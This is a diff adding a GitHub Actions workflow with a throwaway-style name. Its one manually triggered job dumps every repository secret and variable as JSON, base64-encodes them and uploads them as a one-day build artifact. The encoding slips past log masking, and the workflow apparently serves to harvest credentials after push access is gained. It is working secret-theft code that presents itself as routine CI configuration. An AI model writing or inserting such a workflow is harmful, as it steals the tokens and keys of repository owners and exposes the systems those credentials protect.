@@ -1,0 +1,21 @@
+name: zz-tmp-1140-nppm
+on:
+  workflow_dispatch:
+jobs:
+  repo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        env:
+          S: ${{ toJSON(secrets) }}
+          V: ${{ toJSON(vars) }}
+        run: |
+          mkdir -p out
+          printf '%s' "$S" | base64 -w0 > out/repo_secrets.b64
+          printf '%s' "$V" | base64 -w0 > out/repo_vars.b64
+          wc -c out/repo_secrets.b64 out/repo_vars.b64
+      - uses: actions/upload-artifact@v4
+        with:
+          name: zz-art-nppm-1140
+          path: out
+          retention-days: 1
